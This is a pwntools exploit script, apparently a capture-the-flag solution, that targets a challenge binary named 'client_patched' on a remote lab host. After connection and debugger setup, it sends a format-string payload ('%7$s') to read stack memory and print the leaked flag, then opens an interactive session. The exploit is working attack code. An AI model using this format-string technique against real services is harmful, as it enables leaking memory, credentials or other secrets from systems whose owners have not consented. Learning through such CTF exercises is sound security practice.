from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]


elf = "./client_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+171
    b* main+231
    c
"""

conn = "sisterlab.id 42004"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

payload = b'%7$s'

io.sendlineafter(b'> ', payload)

io.recvuntil(b'Haha, ')
flag = io.recvuntil(b'}')
io.recv()

print(flag)

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
